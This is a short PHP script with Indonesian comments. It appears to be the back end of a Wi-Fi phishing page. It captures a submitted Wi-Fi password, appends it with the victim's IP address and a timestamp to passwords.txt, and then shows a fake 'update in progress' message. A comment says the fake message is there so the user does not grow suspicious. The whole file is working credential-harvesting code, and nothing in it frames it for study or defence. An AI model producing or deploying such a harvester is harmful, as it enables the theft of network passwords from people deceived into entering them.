<?php
// Menangkap data dari form
if (isset($_POST['wifi_pass'])) {
    $pass = $_POST['wifi_pass'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $time = date('Y-m-d H:i:s');

    // Format data yang disimpan
    $data = "Waktu: $time | IP: $ip | Password: $pass \n";

    // Simpan ke file passwords.txt
    $file = fopen("passwords.txt", "a");
    fwrite($file, $data);
    fclose($file);

    // Redirect user ke halaman "loading" palsu biar gak curiga
    echo "<h1>Update sedang berlangsung... 1%</h1><p>Jangan tutup halaman ini.</p>";
} else {
    header("Location: index.html");
}
?>
